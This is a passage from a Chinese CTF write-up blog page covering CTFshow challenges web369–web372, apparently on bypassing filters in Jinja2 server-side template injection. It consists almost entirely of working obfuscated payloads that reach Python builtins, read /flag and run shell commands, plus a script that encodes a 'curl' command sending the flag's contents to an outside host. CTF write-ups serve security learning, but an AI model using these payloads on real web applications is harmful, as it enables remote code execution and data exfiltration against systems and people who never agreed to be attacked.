+<pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;&#123; % print (lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()
+)).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read() % &#125;</code></pre>
+<h2 id="替换字符"><a href="#替换字符" class="headerlink" title="替换字符"></a>替换字符</h2><pre class="language-python" data-language="python"><code class="language-python">?name&#x3D;
+&#123; % set a&#x3D;(()|select|string|list).pop(24) % &#125;
+&#123;
+   % set globals&#x3D;(a,a,dict(globals&#x3D;1)|join,a,a)|join % &#125;
+&#123;
+   % set init&#x3D;(a,a,dict(init&#x3D;1)|join,a,a)|join % &#125;
+&#123;
+   % set builtins&#x3D;(a,a,dict(builtins&#x3D;1)|join,a,a)|join % &#125;
+&#123;
+   % set a&#x3D;(lipsum|attr(globals)).get(builtins) % &#125;
+&#123;
+   % set chr&#x3D;a.chr % &#125;
+&#123;
+   % print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() % &#125;
+</code></pre>
+<p>相当于：</p>
+<pre class="language-python" data-language="python"><code class="language-python">lipsum.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;flag&#39;).read()
+
+# 在__builtins__里面拿到chr，同样可以很方便的构造字符
+</code></pre>
+<h1 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h1><h3 id="过滤数字"><a href="#过滤数字" class="headerlink" title="过滤数字"></a>过滤数字</h3><pre class="language-python" data-language="python"><code class="language-python">&#123; %set num&#x3D;dict(aaaaaaaaaaaaaaaaaaaaaaaa&#x3D;a)|join|count% &#125;
+&#123; %set numm&#x3D;dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x3D;a)|join|count% &#125;
+&#123; %set x&#x3D;(()|select|string|list).pop(num)% &#125;
+&#123; %set glob &#x3D; (x,x,dict(globals&#x3D;a)|join,x,x)|join % &#125;
+&#123; %set builtins&#x3D;x~x~(dict(builtins&#x3D;a)|join)~x~x% &#125;
+&#123; %set c &#x3D; dict(chr&#x3D;a)|join% &#125;
+&#123; %set o &#x3D; dict(o&#x3D;a,s&#x3D;a)|join% &#125;
+&#123; %set getitem &#x3D; x~x~(dict(getitem&#x3D;a)|join)~x~x% &#125;
+&#123; %set chr &#x3D; lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)% &#125;
+&#123; %set file &#x3D; chr(numm)~dict(flag&#x3D;a)|join% &#125;
+&#123; %print((lipsum|attr(glob)|attr(getitem)(builtins)).open(file).read())% &#125;</code></pre>
+<h1 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h1><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><pre class="language-python" data-language="python"><code class="language-python">&#123; %set e&#x3D;dict(a&#x3D;a)|join|count% &#125;
+&#123; %set ee&#x3D;dict(aa&#x3D;a)|join|count% &#125;
+&#123; %set eee&#x3D;dict(aaa&#x3D;a)|join|count% &#125;
+&#123; %set eeee&#x3D;dict(aaaa&#x3D;a)|join|count% &#125;
+&#123; %set eeeee&#x3D;dict(aaaaa&#x3D;a)|join|count% &#125;
+&#123; %set eeeeee&#x3D;dict(aaaaaa&#x3D;a)|join|count% &#125;
+&#123; %set eeeeeee&#x3D;dict(aaaaaaa&#x3D;a)|join|count% &#125;
+&#123; %set eeeeeeee&#x3D;dict(aaaaaaaa&#x3D;a)|join|count% &#125;
+&#123; %set eeeeeeeee&#x3D;dict(aaaaaaaaa&#x3D;a)|join|count% &#125;
+&#123; %set eeeeeeeeee&#x3D;dict(aaaaaaaaaa&#x3D;a)|join|count% &#125;
+&#123; %set x&#x3D;(()|select|string|list).pop((ee~eeee)|int)% &#125;
+&#123; %set glob &#x3D; (x,x,dict(globals&#x3D;a)|join,x,x)|join % &#125;
+&#123; %set builtins&#x3D;x~x~(dict(builtins&#x3D;a)|join)~x~x% &#125;
+&#123; %set import&#x3D;x~x~(dict(import&#x3D;a)|join)~x~x% &#125;
+&#123; %set c &#x3D; dict(chr&#x3D;a)|join% &#125;
+&#123; %set o &#x3D; dict(o&#x3D;a,s&#x3D;a)|join% &#125;
+&#123; %set getitem &#x3D; x~x~(dict(getitem&#x3D;a)|join)~x~x% &#125;
+&#123; %set chr &#x3D; lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)% &#125;
+&#123; %set zero&#x3D;chr((eeee~eeeeeeee)|int)% &#125;
+&#123; %set cmd &#x3D; 
+% &#125;
+&#123; %if (lipsum|attr(glob)|attr(getitem)(builtins)).eval(cmd)% &#125;
+eastjun
+&#123; %endif% &#125;</code></pre>
+<p>命令生成脚本：</p>
+<pre class="language-python" data-language="python"><code class="language-python">import re
+def filting(s):
+    return &quot;&quot;.join([f&quot;chr(&#123;ord(i)&#125;)~&quot; for i in s])[:-1]
+cmd&#x3D;filting(&quot;curl https:&#x2F;&#x2F;eastjun.top?flag&#x3D;&#96;cat &#x2F;flag&#96;&quot;)
+nums &#x3D; set(re.findall(&quot;(\d+)&quot;,cmd))
+for i in nums:
+    patnum &#x3D; &quot;&quot;.join([&quot;zero~&quot; if j&#x3D;&#x3D;&quot;0&quot; else f&#39;&#123;&quot;e&quot; * int(j)&#125;~&#39; for j in f&quot;&#123;i&#125;&quot;])
+    cmd &#x3D; cmd.replace(f&quot;&#123;i&#125;&quot;,f&quot;(&#123;patnum[:-1]&#125;)|int&quot;)
+print(cmd)</code></pre>
+<h1 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h1><h3 id="无回显过滤"><a href="#无回显过滤" class="headerlink" title="无回显过滤"></a>无回显过滤</h3><pre class="language-python" data-language="python"><code class="language-python">&#123; %set e&#x3D;dict(a&#x3D;a)|join|length% &#125;
+&#123; %set ee&#x3D;dict(aa&#x3D;a)|join|length% &#125;
+&#123; %set eee&#x3D;dict(aaa&#x3D;a)|join|length% &#125;
+&#123; %set eeee&#x3D;dict(aaaa&#x3D;a)|join|length% &#125;
+&#123; %set eeeee&#x3D;dict(aaaaa&#x3D;a)|join|length% &#125;
+&#123; %set eeeeee&#x3D;dict(aaaaaa&#x3D;a)|join|length% &#125;
+&#123; %set eeeeeee&#x3D;dict(aaaaaaa&#x3D;a)|join|length% &#125;
+&#123; %set eeeeeeee&#x3D;dict(aaaaaaaa&#x3D;a)|join|length% &#125;
+&#123; %set eeeeeeeee&#x3D;dict(aaaaaaaaa&#x3D;a)|join|length% &#125;
+&#123; %set eeeeeeeeee&#x3D;dict(aaaaaaaaaa&#x3D;a)|join|length% &#125;
+&#123; %set x&#x3D;(()|select|string|list).pop((ee~eeee)|int)% &#125;
+&#123; %set glob &#x3D; (x,x,dict(globals&#x3D;a)|join,x,x)|join % &#125;
+&#123; %set builtins&#x3D;x~x~(dict(builtins&#x3D;a)|join)~x~x% &#125;
+&#123; %set import&#x3D;x~x~(dict(import&#x3D;a)|join)~x~x% &#125;
+&#123; %set c &#x3D; dict(chr&#x3D;a)|join% &#125;
+&#123; %set o &#x3D; dict(o&#x3D;a,s&#x3D;a)|join% &#125;
+&#123; %set getitem &#x3D; x~x~(dict(getitem&#x3D;a)|join)~x~x% &#125;
+&#123; %set chr &#x3D; lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)% &#125;
+&#123; %set zero&#x3D;chr((eeee~eeeeeeee)|int)% &#125;
+&#123; %set cmd &#x3D; 
+% &#125;
+&#123; %if (lipsum|attr(glob)|attr(getitem)(builtins)).eval(cmd)% &#125;
+eastjun
+&#123; %endif% &#125;</code></pre>
+
+                        </article>
+                    </div>
+
+
+                    <div class="fleet-content-body-footer">
+                        <!--翻页器-->
+                        <div class="flex-row flex w-full justify-between">
+                            <div class="fleet-content-body-footer-left">
+                                
+                                    <div><a href="/posts/fc839fed/"
+                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
+                                            </svg>
+                                            <div class="flex flex-col items-start"><span
+                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
+                                                <span>web301-w</span></div>
+                                        </a></div>
+                                
+                            </div>
+                            <div class="fleet-content-body-footer-right">
+                                
+                                    <div><a href="/posts/74021304/"
+                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <div class="flex flex-col items-end"><span
+                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
+                                                <span>web279-web300JavaStrut2篇</span></div>
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
+                                            </svg>
+                                        </a></div>
+
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+    <!--    嵌套位置结束-->
+
+
+
+
+
+    <!--<h3>categories</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/CTF/">-->
+    <!--                CTF-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/Python/">-->
+    <!--                Python-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+
+    <!--<h3>tags</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/WriteUp/">-->
+    <!--                WriteUp-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CISCN/">-->
+    <!--                CISCN-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/valorant/">-->
+    <!--                valorant-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/genshin/">-->
+    <!--                genshin-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Shortcut/">-->
+    <!--                Shortcut-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
+    <!--                语雀-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
+    <!--                脚本-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CTFshow0-1/">-->
+    <!--                CTFshow0-1-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Tampermonkey/">-->
+    <!--                Tampermonkey-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+</div>
+<!--返回顶部按钮-->
+<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
+<!--加个渐变，但还是有点丑-->
+<!-- TODO 换个更好的方案-->
+<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
+</div>
+
+<footer class="footer p-10 bg-neutral text-neutral-content">
+    <aside>
+        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
+        © 2020-2024 Lupas by Natro92
+        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
+    </aside>
+    <nav>
+        <header class="footer-title">Social</header>
+        <!--<div class="grid grid-flow-col gap-4">-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
+        <!--</div>-->
+    </nav>
+</footer>
+</body>
+
+</html>
+
+
